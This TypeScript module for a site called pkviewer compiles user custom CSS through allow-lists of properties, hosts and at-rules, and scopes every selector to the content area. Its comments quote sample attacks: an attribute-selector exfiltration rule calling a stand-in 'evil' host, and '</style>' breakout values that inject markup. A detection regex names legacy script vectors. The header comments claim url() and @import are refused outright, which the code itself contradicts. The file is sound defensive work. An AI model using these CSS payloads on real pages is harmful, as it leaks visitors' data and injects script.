/**
 * Custom CSS: an allow-list compiler, not a filter.
 *
 * pkviewer never serves the CSS somebody typed. It parses it, keeps only what
 * it recognises, rewrites every selector so it cannot escape the content area,
 * and emits fresh text. Anything unrecognised is dropped and reported. A
 * blocklist would be the wrong shape here — it fails open on whatever CSS
 * grows next — so nothing reaches a page unless it is named below.
 *
 * The threat model, which is specific to pkviewer serving public pages and the
 * management UI from ONE origin (decision O1):
 *
 *   * EXFILTRATION. `input[value^="a"] { background: url(//evil/a) }` leaks
 *     what it matches, one request at a time. `url()` is refused outright, so
 *     stylesheets make no network requests at all — which also means a visitor's
 *     IP is never handed to a third party by somebody else's page.
 *   * OVERLAYS. A convincing fake sign-in prompt is far more dangerous on an
 *     origin that genuinely serves /login. `position` is limited to `static`
 *     and `relative`, so no element can be lifted out of the flow and laid over
 *     anything.
 *   * ESCAPE. Every selector is rewritten to sit under `#pkv-user`, so no rule
 *     can reach the page shell, and `@import` — which would pull in a whole
 *     unchecked stylesheet — is refused.
 *   * ERASURE. Two things on a public page are not the author's to remove: the
 *     badges pkviewer granted, and the notice saying this is not PluralKit.
 *     Selectors naming them are refused here, and the stylesheet marks their
 *     identity properties `!important` — which is why `!important` is refused
 *     in user CSS. Without that, a rule matching an ancestor could still hide
 *     them, and specificity alone would not save it.
 *
 * The result is deliberately a styling language, not a layout escape hatch.
 */

export const MAX_CSS_LENGTH = 20_000;

/** Everything user CSS is scoped beneath. Public page roots carry this id. */
export const CSS_SCOPE = "#pkv-user";

export type CssIssue = {
  /** 1-based, counted in the source the author typed. */
  line: number;
  kind:
    | "too_long"
    | "at_rule_not_allowed"
    | "property_not_allowed"
    | "value_not_allowed"
    | "selector_not_allowed"
    | "protected_selector"
    | "url_not_allowed"
    | "important_not_allowed"
    | "unparsable";
  detail: string;
};

export type CssResult = {
  /** Compiled, scoped CSS ready to place in a <style>. Empty if nothing survived. */
  css: string;
  /** Everything dropped, with a line number, so the editor can show it. */
  issues: CssIssue[];
  /** Declarations that survived. Zero with a non-empty source means nothing applied. */
  kept: number;
};

/**
 * Properties an author may set.
 *
 * Presentation only. Nothing here can load a resource, escape the content area,
 * or run anything. Additions are cheap; each one is a deliberate decision.
 */
const ALLOWED_PROPERTIES = new Set([
  // colour and text
  "color", "background-color", "opacity",
  // These carry url(), which is checked per-URL against CSS_URL_HOSTS. That is
  // what makes the CDN useful for more than fonts.
  "background-image", "background", "background-position", "background-size",
  "background-repeat", "background-attachment", "background-clip", "background-origin",
  "list-style-image",
  "font-family", "font-size", "font-style", "font-weight", "font-variant",
  "line-height", "letter-spacing", "word-spacing",
  "text-align", "text-decoration", "text-decoration-color", "text-decoration-line",
  "text-decoration-style", "text-decoration-thickness", "text-underline-offset",
  "text-transform", "text-shadow", "text-overflow",
  "white-space", "word-break", "overflow-wrap", "hyphens", "vertical-align",
  "font-feature-settings", "font-variant-numeric",

  // box
  "margin", "margin-top", "margin-right", "margin-bottom", "margin-left",
  "margin-block", "margin-inline",
  "padding", "padding-top", "padding-right", "padding-bottom", "padding-left",
  "padding-block", "padding-inline",
  "width", "min-width", "max-width", "height", "min-height", "max-height",
  "box-sizing", "aspect-ratio", "object-fit", "object-position",

  // border
  "border", "border-top", "border-right", "border-bottom", "border-left",
  "border-width", "border-style", "border-color",
  "border-top-width", "border-right-width", "border-bottom-width", "border-left-width",
  "border-top-style", "border-right-style", "border-bottom-style", "border-left-style",
  "border-top-color", "border-right-color", "border-bottom-color", "border-left-color",
  "border-radius", "border-top-left-radius", "border-top-right-radius",
  "border-bottom-left-radius", "border-bottom-right-radius",
  "outline", "outline-color", "outline-offset", "outline-style", "outline-width",
  "box-shadow",

  // layout, within the flow
  "display", "position", "flex", "flex-basis", "flex-direction", "flex-grow",
  "flex-shrink", "flex-wrap", "gap", "row-gap", "column-gap",
  "align-content", "align-items", "align-self",
  "justify-content", "justify-items", "justify-self",
  "grid-template-columns", "grid-template-rows", "grid-auto-flow", "grid-auto-rows",
  "grid-column", "grid-row", "order",
  "columns", "column-count", "column-gap", "column-width",
  "overflow", "overflow-x", "overflow-y",
  "list-style", "list-style-type", "list-style-position",
  "top", "right", "bottom", "left", "inset", "z-index",

  // decoration
  "transition", "transition-delay", "transition-duration", "transition-property",
  "transition-timing-function",
  "transform", "transform-origin", "rotate", "scale", "translate",
  "filter", "mix-blend-mode", "cursor", "visibility",
]);

/**
 * Hosts a stylesheet may fetch from.
 *
 * `url()` was refused outright at first, because it is how CSS exfiltrates: an
 * attribute selector paired with a background image reports what it matched,
 * one request per guess. Host allow-listing is what makes it safe to reopen —
 * a leak still needs somewhere to arrive, and an author cannot read the request
 * logs of Google Fonts or of pkviewer's own CDN. The technique survives; its
 * destination does not.
 *
 * Matched on the exact hostname, never a suffix, so
 * `fonts.googleapis.com.evil.example` and `https://fonts.googleapis.com@evil.example`
 * are both simply other hosts.
 *
 * Every entry here costs something: visitors' addresses reach it whenever a
 * page using it is viewed. These are hosts pkviewer already asks visitors to
 * contact for its own fonts, so the list adds no party that was not already
 * involved. Adding one that logs per-request and is readable by an author would
 * hand the exfiltration vector straight back.
 */
export const CSS_URL_HOSTS: readonly string[] = [
  "fonts.googleapis.com",
  "fonts.gstatic.com",
  "m.doughmination.gay",
];

/**
 * Values refused wherever they appear.
 *
 * Legacy script-execution surfaces that cost nothing to refuse. `url()` is no
 * longer here — it is checked per-URL against the host list instead.
 */
const FORBIDDEN_VALUE = /expression\s*\(|behaviou?r\s*:|-moz-binding|javascript\s*:|image-set\s*\(|\\[0-9a-f]/i;

const URL_TOKEN = /url\s*\(\s*(['"]?)([^'")]*)\1\s*\)/gi;

/**
 * True when every `url()` in a value points at an allow-listed https host.
 *
 * Parsed with `URL` rather than matched with a pattern: a regex over a URL is
 * how host checks get bypassed, and `new URL()` agrees with the browser about
 * what the host actually is.
 */
export function urlsAllowed(value: string): boolean {
  for (const match of value.matchAll(URL_TOKEN)) {
    const raw = (match[2] ?? "").trim();
    if (!raw) return false;
    let parsed: URL;
    try {
      parsed = new URL(raw);
    } catch {
      // Protocol-relative and relative URLs both land here. Refusing them keeps
      // "which host is this" from depending on where the page was served.
      return false;
    }
    if (parsed.protocol !== "https:") return false;
    if (!CSS_URL_HOSTS.includes(parsed.hostname)) return false;
  }
  return true;
}

/**
 * The compiled stylesheet is placed inside a <style> element, and `</style>`
 * is the one sequence that escapes one — after which the rest of the value is
 * markup, not CSS.
 *
 * Refusing `<` and `>` outright is the fix rather than escaping them: neither
 * has any business in a declaration value, and an allow-list that has to get
 * escaping exactly right is an allow-list with a bug in it. This is why the
 * renderer does no checking of its own — the guarantee belongs here.
 */
const MARKUP_ESCAPE = /[<>]/;

/** `position` is limited to what cannot lift an element over the page. */
const ALLOWED_POSITION = new Set(["static", "relative"]);

/**
 * Selector fragments that name something the author does not own.
 *
 * Badges are pkviewer's statement about a system, and the disclosure is what
 * keeps a third-party site from reading as an official one. Neither is part of
 * the page's appearance.
 */
const PROTECTED = [
  "pkvb",
  "site-footer",
  "site-footer-links",
  "pkv-badges",
];

/** Characters a selector may contain. Anything else is refused rather than escaped. */
const SELECTOR_SHAPE = /^[a-zA-Z0-9\s.,:#_\-[\]="'()>+~*]+$/;

/** Selectors that would reach outside the content area even when scoped. */
const SELECTOR_FORBIDDEN = /(^|[\s,>+~])(html|body|:root)\b|::part|::slotted|:host/i;

const ALLOWED_AT_RULES = new Set(["media", "supports", "font-face"]);

/**
 * `@font-face` descriptors. Not properties — a different vocabulary entirely,
 * which is why it gets its own list rather than reusing ALLOWED_PROPERTIES.
 */
const FONT_FACE_DESCRIPTORS = new Set([
  "font-family", "src", "font-weight", "font-style", "font-stretch",
  "font-display", "font-variant", "font-feature-settings",
  "font-variation-settings", "unicode-range", "size-adjust",
  "ascent-override", "descent-override", "line-gap-override",
]);

/**
 * `@import` is allowed from Google Fonts and nowhere else.
 *
 * This is the one thing pkviewer serves without compiling, and it is worth
 * being plain about: the stylesheet that arrives is whatever that host returns.
 * It is permitted because copying the `@import` line is how anyone actually
 * uses Google Fonts, and because that host exists to return `@font-face` rules
 * pointing at fonts.gstatic.com — both already on the allow-list, and both
 * already contacted by pkviewer's own font loading.
 *
 * It is locked to that single host, not to the whole allow-list: the CDN serves
 * arbitrary files, and importing an arbitrary file as a stylesheet would be a
 * way to smuggle in rules that never met the compiler.
 */
const IMPORT_HOST = "fonts.googleapis.com";

/**
 * What an at-rule prelude may contain.
 *
 * The prelude is written to the output as-is, so it is exactly as dangerous as
 * a declaration value and gets the same treatment: a positive character class
 * rather than a list of things to strip. `@media </style><script>` parsed as a
 * perfectly ordinary media rule before this existed.
 */
const AT_PRELUDE_SHAPE = /^@[a-z-]+[a-zA-Z0-9\s():,._%-]*$/;

/** Strips comments while preserving newlines, so reported line numbers stay true. */
function stripComments(css: string): string {
  return css.replace(/\/\*[\s\S]*?\*\//g, (m) => m.replace(/[^\n]/g, " "));
}

function lineOf(source: string, index: number): number {
  let line = 1;
  for (let i = 0; i < index && i < source.length; i++) {
    if (source[i] === "\n") line++;
  }
  return line;
}

/**
 * Rewrites one selector list so every part sits under the scope.
 *
 * `a, .card` becomes `#pkv-user a, #pkv-user .card`. A selector already naming
 * the scope is left alone rather than doubled.
 */
function scopeSelector(selectorList: string): { ok: true; value: string } | { ok: false; reason: CssIssue["kind"]; detail: string } {
  const parts = selectorList.split(",").map((s) => s.trim()).filter(Boolean);
  if (parts.length === 0) return { ok: false, reason: "selector_not_allowed", detail: selectorList };

  const scoped: string[] = [];
  for (const part of parts) {
    if (!SELECTOR_SHAPE.test(part)) {
      return { ok: false, reason: "selector_not_allowed", detail: part };
    }
    if (SELECTOR_FORBIDDEN.test(part)) {
      return { ok: false, reason: "selector_not_allowed", detail: part };
    }
    for (const name of PROTECTED) {
      if (part.includes(name)) {
        return { ok: false, reason: "protected_selector", detail: part };
      }
    }
    // A leading combinator has nothing to combine with once scoped.
    if (/^[>+~]/.test(part)) {
      return { ok: false, reason: "selector_not_allowed", detail: part };
    }
    scoped.push(part.startsWith(CSS_SCOPE) ? part : `${CSS_SCOPE} ${part}`);
  }
  return { ok: true, value: scoped.join(", ") };
}

function sanitizeDeclarations(
  block: string,
  source: string,
  offset: number,
  issues: CssIssue[],
  vocabulary: ReadonlySet<string> = ALLOWED_PROPERTIES,
): { text: string; kept: number } {
  const out: string[] = [];
  let kept = 0;
  // A running cursor, because `indexOf` inside a chunk gives an offset into the
  // chunk rather than into the source, and every line number after the first
  // declaration of a block came out wrong.
  let cursor = offset;

  for (const raw of block.split(";")) {
    const chunkStart = cursor;
    cursor += raw.length + 1; // +1 for the ";" the split consumed
    const declaration = raw.trim();
    if (!declaration) continue;

    const colon = declaration.indexOf(":");
    if (colon === -1) {
      issues.push({
        line: lineOf(source, offset),
        kind: "unparsable",
        detail: declaration.slice(0, 60),
      });
      continue;
    }

    const property = declaration.slice(0, colon).trim().toLowerCase();
    const value = declaration.slice(colon + 1).trim();
    const line = lineOf(source, chunkStart + raw.indexOf(declaration));

    if (/!\s*important/i.test(value)) {
      // Reserved for the rules protecting badges and the site disclosure. If
      // authors could use it, those protections would be a specificity race.
      issues.push({ line, kind: "important_not_allowed", detail: property });
      continue;
    }
    if (!vocabulary.has(property)) {
      issues.push({ line, kind: "property_not_allowed", detail: property });
      continue;
    }
    if (value.length === 0 || value.length > 400) {
      issues.push({ line, kind: "value_not_allowed", detail: property });
      continue;
    }
    if (FORBIDDEN_VALUE.test(value)) {
      issues.push({ line, kind: "value_not_allowed", detail: `${property}: ${value.slice(0, 40)}` });
      continue;
    }
    if (!urlsAllowed(value)) {
      issues.push({ line, kind: "url_not_allowed", detail: `${property}: ${value.slice(0, 40)}` });
      continue;
    }
    if (
      vocabulary === ALLOWED_PROPERTIES &&
      property === "position" &&
      !ALLOWED_POSITION.has(value.toLowerCase())
    ) {
      issues.push({ line, kind: "value_not_allowed", detail: `position: ${value}` });
      continue;
    }
    // Braces surviving in a value mean the parse disagreed with the author
    // about where this declaration ended.
    if (/[{}]/.test(value)) {
      issues.push({ line, kind: "unparsable", detail: property });
      continue;
    }
    // `width: </style><img onerror=...>` would otherwise close the element and
    // continue as markup. Nothing legitimate needs these characters.
    if (MARKUP_ESCAPE.test(value)) {
      issues.push({ line, kind: "value_not_allowed", detail: property });
      continue;
    }

    out.push(`  ${property}: ${value};`);
    kept++;
  }

  return { text: out.join("\n"), kept };
}

/**
 * Compiles author CSS into scoped, allow-listed CSS.
 *
 * Never throws: malformed input produces issues and whatever was valid, so a
 * typo costs the author one rule rather than their whole stylesheet.
 */
export function sanitizeCss(input: unknown): CssResult {
  const issues: CssIssue[] = [];
  if (typeof input !== "string" || input.trim().length === 0) {
    return { css: "", issues, kept: 0 };
  }
  if (input.length > MAX_CSS_LENGTH) {
    return {
      css: "",
      issues: [{ line: 1, kind: "too_long", detail: `${input.length} of ${MAX_CSS_LENGTH} characters` }],
      kept: 0,
    };
  }

  const source = stripComments(input);
  const out: string[] = [];
  let kept = 0;
  let i = 0;

  while (i < source.length) {
    // A statement at-rule (`@import ...;`) ends at a semicolon and has no
    // block. Without this the parser reads ahead to the NEXT rule's brace and
    // swallows it whole.
    const statement = /^\s*@([a-z-]+)([^;{}]*);/i.exec(source.slice(i));
    if (statement) {
      const name = statement[1]!.toLowerCase();
      const rest = statement[2] ?? "";
      const line = lineOf(source, i + (statement[0].length - statement[0].trimStart().length));
      if (name === "import" && importAllowed(rest)) {
        out.push(`@import ${rest.trim()};`);
        kept++;
      } else {
        issues.push({
          line,
          kind: name === "import" ? "url_not_allowed" : "at_rule_not_allowed",
          detail: `@${name}${rest}`.slice(0, 60),
        });
      }
      i += statement[0].length;
      continue;
    }

    const open = source.indexOf("{", i);
    if (open === -1) {
      const trailing = source.slice(i).trim();
      if (trailing) {
        issues.push({ line: lineOf(source, i), kind: "unparsable", detail: trailing.slice(0, 60) });
      }
      break;
    }

    const rawPrelude = source.slice(i, open);
    const prelude = rawPrelude.trim();
    // Where the selector actually starts, so a rule reports its own line rather
    // than the one the previous rule closed on.
    const preludeLine = lineOf(source, i + (rawPrelude.length - rawPrelude.trimStart().length));

    // ---------------------------------------------------------- at-rules --
    if (prelude.startsWith("@")) {
      const name = prelude.slice(1).split(/[\s(]/)[0]!.toLowerCase();
      const close = matchBrace(source, open);
      if (close === -1) {
        issues.push({ line: preludeLine, kind: "unparsable", detail: prelude.slice(0, 60) });
        break;
      }
      if (!ALLOWED_AT_RULES.has(name)) {
        issues.push({ line: preludeLine, kind: "at_rule_not_allowed", detail: `@${name}` });
        i = close + 1;
        continue;
      }
      if (FORBIDDEN_VALUE.test(prelude) || !AT_PRELUDE_SHAPE.test(prelude)) {
        issues.push({ line: preludeLine, kind: "at_rule_not_allowed", detail: prelude.slice(0, 60) });
        i = close + 1;
        continue;
      }
      if (name === "font-face") {
        const face = sanitizeDeclarations(
          source.slice(open + 1, close),
          source,
          open + 1,
          issues,
          FONT_FACE_DESCRIPTORS,
        );
        // A face whose `src` was refused has nothing left to load, so the whole
        // block goes rather than leaving a declaration that names a family it
        // cannot supply.
        if (face.kept > 0 && /(^|\n)\s*src:/.test(face.text)) {
          out.push(`@font-face {\n${face.text}\n}`);
          kept += face.kept;
        }
        i = close + 1;
        continue;
      }

      // Recurse into the body: the rules inside are scoped exactly as they
      // would be outside, so a media query cannot smuggle an unscoped rule.
      const inner = sanitizeCss(source.slice(open + 1, close));
      for (const issue of inner.issues) {
        issues.push({ ...issue, line: issue.line + preludeLine - 1 });
      }
      if (inner.kept > 0) {
        out.push(`${prelude} {\n${inner.css}\n}`);
        kept += inner.kept;
      }
      i = close + 1;
      continue;
    }

    // ------------------------------------------------------------- rules --
    const close = source.indexOf("}", open);
    if (close === -1) {
      issues.push({ line: preludeLine, kind: "unparsable", detail: prelude.slice(0, 60) });
      break;
    }

    const selector = scopeSelector(prelude);
    if (!selector.ok) {
      issues.push({ line: preludeLine, kind: selector.reason, detail: selector.detail.slice(0, 60) });
      i = close + 1;
      continue;
    }

    const body = sanitizeDeclarations(source.slice(open + 1, close), source, open + 1, issues);
    if (body.kept > 0) {
      out.push(`${selector.value} {\n${body.text}\n}`);
      kept += body.kept;
    }
    i = close + 1;
  }

  return { css: out.join("\n\n"), issues, kept };
}

/** True for an `@import` naming a stylesheet on the one permitted host. */
function importAllowed(rest: string): boolean {
  const match = /url\s*\(\s*(['"]?)([^'")]*)\1\s*\)|^\s*(['"])([^'"]*)\3/i.exec(rest.trim());
  const raw = (match?.[2] ?? match?.[4] ?? "").trim();
  if (!raw) return false;
  try {
    const parsed = new URL(raw);
    return parsed.protocol === "https:" && parsed.hostname === IMPORT_HOST;
  } catch {
    return false;
  }
}

/** Index of the `}` matching the `{` at `open`, or -1. */
function matchBrace(source: string, open: number): number {
  let depth = 0;
  for (let i = open; i < source.length; i++) {
    if (source[i] === "{") depth++;
    else if (source[i] === "}") {
      depth--;
      if (depth === 0) return i;
    }
  }
  return -1;
}

export const CSS_ISSUE_MESSAGES: Readonly<Record<CssIssue["kind"], string>> = {
  too_long: "This stylesheet is too long.",
  at_rule_not_allowed: "Only @media and @supports are available.",
  property_not_allowed: "That property is not available.",
  value_not_allowed: "That value is not allowed here.",
  selector_not_allowed: "That selector is not allowed.",
  protected_selector: "Badges and the site notice cannot be restyled.",
  url_not_allowed: "Only Google Fonts and the pkviewer CDN can be linked to.",
  important_not_allowed: "!important is not available.",
  unparsable: "This could not be read as CSS.",
};
